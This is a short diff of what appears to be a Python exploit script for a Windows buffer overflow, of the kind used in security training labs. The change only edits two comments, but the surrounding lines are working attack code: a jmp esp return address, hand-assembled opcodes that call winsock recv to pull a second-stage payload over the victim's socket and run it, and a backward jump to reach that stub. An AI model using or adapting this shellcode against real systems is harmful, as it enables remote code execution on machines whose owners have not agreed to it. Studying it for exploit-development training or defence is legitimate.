@@ -22,7 +22,7 @@ eip = "625011BB"		# jmp esp addr
 
 # Call winsocket.recv
 # Ref.: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
-# REMEMBER TO UPDATE THE STRING! Recalc params and replace in string
+# REMEMBER TO: recalc params and replace in string
 call = "54"		# PUSH ESP
 call += "5A"		# POP EDX
 call += "6681C28801"	# ADD DX, 0x18 <-- socket
@@ -42,7 +42,7 @@ call += "C1E808"	# SHR EAX, 8
 call += "FFD0"		# CALL EAX
 
 # Reverse jmp
-# REMEMBER TO UPDATE THE STRING
+# REMEMBER TO: recalc and update string
 revJmp = "EBB7"		# JMP $-0x47 <-- reverse jmp size
 
 
